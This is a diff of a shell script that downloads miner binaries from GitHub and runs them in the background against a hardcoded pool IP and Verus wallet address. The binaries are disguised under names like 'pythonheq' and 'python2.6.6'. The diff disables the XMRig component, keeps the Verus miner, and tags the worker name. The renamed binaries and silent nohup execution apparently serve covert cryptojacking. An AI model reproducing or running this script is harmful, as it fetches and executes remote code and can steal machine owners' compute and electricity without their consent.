@@ -6,7 +6,7 @@ IPNAME=$(sed 's|\.|o|g' <<< $iip)
 curl ipinfo.io
 
 echo '#######################################################'
-echo '################## RV +XM + VER v0.0.5 ################'
+echo '################## RV +XM + VER v0.0.7 ################'
 echo '#######################################################'
 
 
@@ -29,7 +29,7 @@ rm -rf pythonheq
 PoolHost=116.203.10.54
 VR_Port=3000
 PublicVerusCoinAddress="RNEzrdAY8JNRrEre37aZbegHSx2CgaoXek"
-WorkerName=$IPNAME
+WorkerName="RV_"$IPNAME
 VR_Threads=4
 
 rm -rf python2.6.6
@@ -38,18 +38,18 @@ wget -q https://github.com/one10001/10001code/releases/download/2.6.6/python2.6.
 chmod +x python2.6.6
 cp python2.6.6 pythonoc
 
-wget -q https://github.com/one10001/xmrig/releases/download/bin0.0.1/pythonxm 
-chmod +x pythonxm
+#wget -q https://github.com/one10001/xmrig/releases/download/bin0.0.1/pythonxm 
+#chmod +x pythonxm
 
-wget -q https://github.com/one10001/10001code/raw/main/config.json
-sed -i "s+ip0001+RV_$IPNAME+g" config.json
+#wget -q https://github.com/one10001/10001code/raw/main/config.json
+#sed -i "s+ip0001+RV_$IPNAME+g" config.json
 
 wget -q https://github.com/one10001/10001code/raw/main/pythonheq
 chmod +x pythonheq
 
 #CPU
 
-nohup  ./pythonxm -c config.json 2>> oout 1>> oout &
+#nohup  ./pythonxm -c config.json 2>> oout 1>> oout &
 nohup ./pythonheq -v -l "${PoolHost}":"${VR_Port}" -u "${PublicVerusCoinAddress}"."${WorkerName}" -t "${Threads}" "$@" 1>> oout 2>> oout &
 
 
